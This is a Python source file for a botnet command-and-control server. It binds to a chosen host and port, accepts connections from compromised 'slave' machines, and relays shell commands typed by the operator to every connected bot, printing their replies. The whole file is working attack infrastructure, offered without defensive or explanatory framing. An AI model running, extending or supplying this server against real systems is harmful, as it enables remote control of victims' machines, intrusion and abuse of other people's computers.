import socket
import sys
import os
import threading
import queue
import time
from cmd import Cmd

q = queue.Queue()
SocketThreads = []
ClientDict = {}

def main():
    if (len(sys.argv) < 3):
        print ("[!] Usage:\n [+] python3 {} <LHOST> <LPORT>\n".format(sys.argv[0]))
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost,lport, q)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: {}\n".format(str(ex)))


def listener(lhost,lport,q):
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    server.bind((lhost,lport))
    server.listen(100)

    print("[+] Starting C&C server on tcp://{}:{}".format(lhost,lport))
    
    BotCmdThread = BotCmd(q)
    BotCmdThread.start()
    while True:
        (client, client_address) = server.accept()
        newthread = BotHandler(client,client_address, q, ClientDict)
        SocketThreads.append(newthread)
        newthread.start()


class Terminal(Cmd):
    prompt = ''
    def __init__(self, qv3):
        # super() needed to correctly initialize class
        super(Terminal, self).__init__()
        self.q = qv3
    
    def do_exit(self,args):
        for _ in range(len(SocketThreads)):
            time.sleep(0.1)
            self.q.put("exit\n")
        time.sleep(1)
        os._exit(0)

    def emptyline(self):
        for _ in range(len(SocketThreads)):
            time.sleep(0.1)
            self.q.put("\n")

    def default(self, args):
        print("[DBG] Sending command to {} bots: {}".format(len(SocketThreads),args))
        for _ in range(len(SocketThreads)):
            time.sleep(0.1)
            self.q.put(args+"\n")
        time.sleep(0.5) # To not input prompt before response


class BotCmd(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)
        self.q = qv2
    
    def run(self):
        terminal = Terminal(self.q)
        terminal.cmdloop()


class BotHandler(threading.Thread):
    def __init__(self, client, client_address, qv, ClientDict):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.q = qv
        self.ClientList = ClientDict

    def run(self):
        BotName = threading.current_thread().getName()
        print("\n[*] Slave {}:{} connected with Thread-ID: {}\n".format(self.ip,self.port,BotName))
        self.client.send("Verifying connection. Go to process creation thread.".encode("utf-8"))
        try:
            self.client.settimeout(3)
            banner = self.client.recv(1024).decode('utf-8')
            print(banner)
        except:
            pass
        self.ClientList[BotName] = self.client_address
        while True:
            RecvBotCmd = self.q.get()
            try:
                self.client.send(RecvBotCmd.encode('utf-8'))
                self.client.settimeout(3)
                try:
                    resp = self.client.recv(1024).decode('utf-8')
                    print(resp)
                except:
                    continue
            except Exception as ex:
                print("Exception occured during command sending: {}".format(ex))
                break


if __name__ == '__main__':
    main()
